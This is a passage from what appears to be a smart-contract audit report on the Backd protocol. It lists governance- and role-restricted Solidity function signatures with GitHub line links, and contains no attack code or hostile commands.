(bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L61-L65\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #7\r\n\r\n150     function prepareKeeperFee(uint256 newKeeperFee) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L150\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #8\r\n\r\n170     function resetKeeperFee() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L170\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #9\r\n\r\n174     function prepareKeeperGauge(address lpToken, address newKeeperGauge)\r\n175         external\r\n176         onlyGovernance\r\n177         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L174-L177\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #10\r\n\r\n186     function resetKeeperGauge(address lpToken) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L186\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #11\r\n\r\n195     function prepareTreasuryFee(uint256 newTreasuryFee) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L195\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #12\r\n\r\n215     function resetTreasuryFee() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L215\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #13\r\n\r\n180     function initialize(\r\n181         address feeHandler,\r\n182         bytes32[] calldata protocols,\r\n183         address[] calldata handlers\r\n184     ) external initializer onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L180-L184\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #14\r\n\r\n318     function resetTopUpHandler(bytes32 protocol) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L318\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #15\r\n\r\n327     function prepareActionFee(uint256 newActionFee) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L327\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #16\r\n\r\n345     function resetActionFee() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L345\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #17\r\n\r\n354     function prepareSwapperSlippage(uint256 newSwapperSlippage)\r\n355         external\r\n356         onlyGovernance\r\n357         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L354-L357\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #18\r\n\r\n380     function resetSwapperSlippage() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L380\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #19\r\n\r\n390     function prepareFeeHandler(address handler) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L390\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #20\r\n\r\n407     function resetFeeHandler() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L407\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #21\r\n\r\n416     function prepareEstimatedGasUsage(uint256 gasUsage) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L416\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #22\r\n\r\n432     function resetGasUsage() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L432\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #23\r\n\r\n442     function addUsableToken(address token) external override onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L442\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #24\r\n\r\n742     function prepareTopUpHandler(bytes32 protocol, address newHandler)\r\n743         public\r\n744         onlyGovernance\r\n745         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L742-L745\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #25\r\n\r\n63     function addFeeHandler(address feeHandler) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L63\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #26\r\n\r\n69     function removeFeeHandler(address feeHandler) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L69\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #27\r\n\r\n79     function addAction(address action) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L79\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #28\r\n\r\n91     function addPool(address pool)\r\n92         external\r\n93         override\r\n94         onlyRoles2(Roles.POOL_FACTORY, Roles.GOVERNANCE)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L91-L94\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #29\r\n\r\n115     function removePool(address pool) external override onlyRole(Roles.CONTROLLER) returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L115\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #30\r\n\r\n156     function updateVault(address previousVault, address newVault) external onlyRole(Roles.POOL) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L156\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #31\r\n\r\n201     function initializeAddress(\r\n202         bytes32 key,\r\n203         address initialAddress,\r\n204         bool freezable\r\n205     ) public override onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L201-L205\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #32\r\n\r\n215     function initializeAndFreezeAddress(bytes32 key, address initialAddress)\r\n216         external\r\n217         override\r\n218         onlyGovernance\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L215-L218\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #33\r\n\r\n228     function freezeAddress(bytes32 key) external override onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L228\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #34\r\n\r\n242     function prepareAddress(bytes32 key, address newAddress)\r\n243         external\r\n244         override\r\n245         onlyGovernance\r\n246         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L242-L246\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #35\r\n\r\n267     function resetAddress(bytes32 key) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L267\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #36\r\n\r\n277     function addStakerVault(address stakerVault)\r\n278         external\r\n279         override\r\n280         onlyRole(Roles.CONTROLLER)\r\n281         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L277-L281\r\n\r\n```solidity\r\nFile: contracts/Controller.sol   #37\r\n\r\n31     function setInflationManager(address _inflationManager) external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L31\r\n\r\n```solidity\r\nFile: contracts/Controller.sol   #38\r\n\r\n37     function addStakerVault(address stakerVault)\r\n38         external\r\n39         override\r\n40         onlyRoles2(Roles.GOVERNANCE, Roles.POOL_FACTORY)\r\n41         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L37-L41\r\n\r\n```solidity\r\nFile: contracts/Controller.sol   #39\r\n\r\n60     function removePool(address pool) external override onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L60\r\n\r\n```solidity\r\nFile: contracts/Controller.sol   #40\r\n\r\n79     function prepareKeeperRequiredStakedBKD(uint256 amount) external override onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L79\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #41\r\n\r\n82     function setSpendRatio(uint256 _spendRatio) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L82\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #42\r\n\r\n119     function setWithdrawalFlag() external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L119\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #43\r\n\r\n126     function resetWithdrawalFlag() external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L126\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #44\r\n\r\n150     function setTreasury(address _treasury) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L150\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #45\r\n\r\n160     function withdraw(address token) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L160\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #46\r\n\r\n170     function withdrawCvxCrv(uint256 amount) external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L170\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #47\r\n\r\n178     function unstakeCvxCrv() external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L178\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #48\r\n\r\n182     function unstakeCvxCrv(uint256 amount, bool withdrawal) external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L182\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #49\r\n\r\n189     function setDelegate(address delegateContract, address delegate) external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L189\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #50\r\n\r\n196     function clearDelegate(address delegateContract) external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L196\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #51\r\n\r\n200     function forfeitRewards(address token, uint256 index) external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L200\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #52\r\n\r\n222     function withdraw(address token, uint256 amount) public onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L222\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #53\r\n\r\n230     function unstakeCvxCrv(bool withdrawal) public onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L230\r\n\r\n```solidity\r\nFile: contracts/LpToken.sol   #54\r\n\r\n46     function mint(address account, uint256 amount) external override onlyMinter {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol#L46\r\n\r\n```solidity\r\nFile: contracts/LpToken.sol   #55\r\n\r\n64     function burn(address owner, uint256 burnAmount)\r\n65         external\r\n66         override\r\n67         onlyMinter\r\n68         returns (uint256)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol#L64-L68\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkOracleProvider.sol   #56\r\n\r\n29     function setFeed(address asset, address feed) external override onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkOracleProvider.sol#L29\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkOracleProvider.sol   #57\r\n\r\n40     function setStalePriceDelay(uint256 stalePriceDelay_) external override onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkOracleProvider.sol#L40\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #58\r\n\r\n126     function withdrawAll() external override onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L126\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #59\r\n\r\n130     function setLpToken(address _lpToken)\r\n131         external\r\n132         override\r\n133         onlyRoles2(Roles.GOVERNANCE, Roles.POOL_FACTORY)\r\n134         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L130-L134\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #60\r\n\r\n178     function prepareNewRequiredReserves(uint256 _newRatio) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L178\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #61\r\n\r\n198     function resetRequiredReserves() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L198\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #62\r\n\r\n207     function prepareNewReserveDeviation(uint256 newRatio) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L207\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #63\r\n\r\n227     function resetNewReserveDeviation() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L227\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #64\r\n\r\n236     function prepareNewMinWithdrawalFee(uint256 newFee) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L236\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #65\r\n\r\n256     function resetNewMinWithdrawalFee() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L256\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #66\r\n\r\n265     function prepareNewMaxWithdrawalFee(uint256 newFee) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L265\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #67\r\n\r\n285     function resetNewMaxWithdrawalFee() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L285\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #68\r\n\r\n294     function prepareNewWithdrawalFeeDecreasePeriod(uint256 newPeriod)\r\n295         external\r\n296         onlyGovernance\r\n297         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L294-L297\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #69\r\n\r\n315     function resetNewWithdrawalFeeDecreasePeriod() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L315\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #70\r\n\r\n325     function setStaker()\r\n326         external\r\n327         override\r\n328         onlyRoles2(Roles.GOVERNANCE, Roles.POOL_FACTORY)\r\n329         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L325-L329\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #71\r\n\r\n345     function prepareNewVault(address _vault) external override onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L345\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #72\r\n\r\n369     function resetNewVault() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L369\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #73\r\n\r\n386     function uncap() external override onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L386\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #74\r\n\r\n398     function updateDepositCap(uint256 _depositCap) external override onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L398\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #75\r\n\r\n410     function rebalanceVault() external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L410\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #76\r\n\r\n90     function addPoolImplementation(bytes32 name, address implementation)\r\n91         external\r\n92         onlyGovernance\r\n93         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L90-L93\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #77\r\n\r\n103     function addLpTokenImplementation(bytes32 name, address implementation)\r\n104         external\r\n105         onlyGovernance\r\n106         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L103-L106\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #78\r\n\r\n116     function addVaultImplementation(bytes32 name, address implementation)\r\n117         external\r\n118         onlyGovernance\r\n119         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L116-L119\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #79\r\n\r\n129     function addStakerVaultImplementation(bytes32 name, address implementation)\r\n130         external\r\n131         onlyGovernance\r\n132         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L129-L132\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #80\r\n\r\n148     function deployPool(\r\n149         string calldata poolName,\r\n150         uint256 depositCap,\r\n151         address underlying,\r\n152         LpTokenArgs calldata lpTokenArgs,\r\n153         VaultArgs calldata vaultArgs,\r\n154         ImplementationNames calldata implementationNames\r\n155     ) external onlyGovernance returns (Addresses memory addrs) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L148-L155\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #81\r\n\r\n69     function initializeLpGauge(address _lpGauge) external override onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L69\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #82\r\n\r\n76     function prepareLpGauge(address _lpGauge) external override onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L76\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #83\r\n\r\n81     function executeLpGauge() external override onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L81\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #84\r\n\r\n82     function setHopImbalanceToleranceIn(uint256 _hopImbalanceToleranceIn)\r\n83         external\r\n84         onlyGovernance\r\n85         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L82-L85\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #85\r\n\r\n98     function setHopImbalanceToleranceOut(uint256 _hopImbalanceToleranceOut)\r\n99         external\r\n100         onlyGovernance\r\n101         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L98-L101\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #86\r\n\r\n115     function changeConvexPool(\r\n116         uint256 convexPid_,\r\n117         address curvePool_,\r\n118         uint256 curveIndex_\r\n119     ) external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L115-L119\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #87\r\n\r\n116     function deposit() external payable override onlyVault returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L116\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #88\r\n\r\n130     function withdraw(uint256 amount_) external override onlyVault returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L130\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #89\r\n\r\n159     function harvest() external override onlyVault returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L159\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #90\r\n\r\n167     function shutdown() external override onlyVault returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L167\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #91\r\n\r\n181     function setCommunityReserve(address _communityReserve) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L181\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #92\r\n\r\n192     function setCrvCommunityReserveShare(uint256 crvCommunityReserveShare_)\r\n193         external\r\n194         onlyGovernance\r\n195         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L192-L195\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #93\r\n\r\n209     function setCvxCommunityReserveShare(uint256 cvxCommunityReserveShare_)\r\n210         external\r\n211         onlyGovernance\r\n212         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L209-L212\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #94\r\n\r\n227     function setImbalanceToleranceIn(uint256 imbalanceToleranceIn_)\r\n228         external\r\n229         onlyGovernance\r\n230         returns 